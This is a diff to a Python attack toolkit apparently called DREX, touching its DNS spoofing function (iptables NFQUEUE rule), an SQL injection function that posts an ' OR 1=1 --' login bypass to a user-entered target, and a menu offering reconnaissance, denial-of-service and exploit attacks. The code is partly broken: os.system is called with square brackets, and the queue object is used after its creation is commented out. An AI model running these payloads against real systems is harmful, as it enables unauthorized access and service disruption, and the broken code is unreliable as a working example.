@@ -5,7 +5,7 @@ import sys
 import urllib.request
 from ipaddress import IPv4Network
 from tqdm import tqdm
-from netfilterqueue import NetfilterQueue
+#from netfilterqueue import NetfilterQueue
 import requests
 
 def os_detection():
@@ -363,7 +363,7 @@ def dns_spoofing():
         #insert the iptables FORWARD rule
         os.system["iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM)]
         #instantiate the netfiler queue
-        queue = NetfilterQueue()
+        #queue = NetfilterQueue()
         try:
             queue.bind(QUEUE_NUM, process_packet)
             queue.run()
@@ -388,16 +388,12 @@ def sql_injection():
     target = input()
     print("[-] Attempting an SQL injection attack...")
     
-    r = requests.post(target+'&username=\'+OR+1%3D1+--+\'&password=&user-info-php-submit-button=View+Account+Details', json={"username": "' OR 1=1 --'", "password": ""})
+    r = requests.post(target, json={"username": "' OR 1=1 --'", "password": ""})
 
-    with open("Desktop/response.html", "w") as file:
-        file.write(r.text)
+    print(r.text)
 
-    print('Response saved in HTML File!')
-
-    time.sleep(60)
+    time.sleep(5)
     choose_exploit()
-    
     
 
 
@@ -544,13 +540,17 @@ def main():
 '''
 
     print(string)
+    print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
+    print("DREX: Denial of service, Reconnaissance, Exploits eXecutable")
+    print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
+    print("\n")
     while True:
         print("-----------------------------------")
-        print("Welcome. Choose a category of attacks.")
-        print("1. Reconnaissance")
-        print("2. Denial of Service")
-        print("3. Exploits")
-        print("4. Exit")
+        print("Choose a category of attacks.")
+        print("[-] 1. Reconnaissance")
+        print("[-] 2. Denial of Service")
+        print("[-] 3. Exploits")
+        print("[-] 4. Exit")
         print("-----------------------------------")
 
         choice = input("Enter your choice: ")
